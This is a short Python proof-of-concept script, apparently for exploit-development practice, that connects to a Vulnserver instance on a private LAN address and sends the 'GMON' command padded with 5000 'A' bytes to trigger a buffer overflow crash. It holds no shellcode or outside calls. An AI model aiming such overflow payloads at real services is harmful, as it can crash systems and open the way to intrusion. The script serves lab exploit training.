#!/usr/bin/python3
#just a POC

print("*****************************************************")
print("_______________*********************_________________")
print("___________*******vulnserver_FUZZER*********_________")
print("________****Authored by ianwolf99****_________________")
print("******************************************************") 

import socket

host = "192.168.43.49" #ip address of the host to fuzz
port = 9999            #port of the host to fuzz
buf = b"A" * 5000       #Amount of buffer to send

socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # create socket
connect = socket.connect((host,port))                     #connect to host and port
banner = socket.recv(1024)                                #the banner on server
print(banner.decode())                                    #show the banner
fuzz_command = "GMON /:/".encode() + bytearray(buf) + "\r\n".encode() #the fuzz command to send
socket.send(fuzz_command)                                             #send the fuzz command
banner2 = socket.recv(1024)
print(banner2.decode())
#Exit_command = "EXIT /:/".encode() + "\r\n".encode()
#banner3 = socket.recv(1024)
#print(banner3)
socket.close()



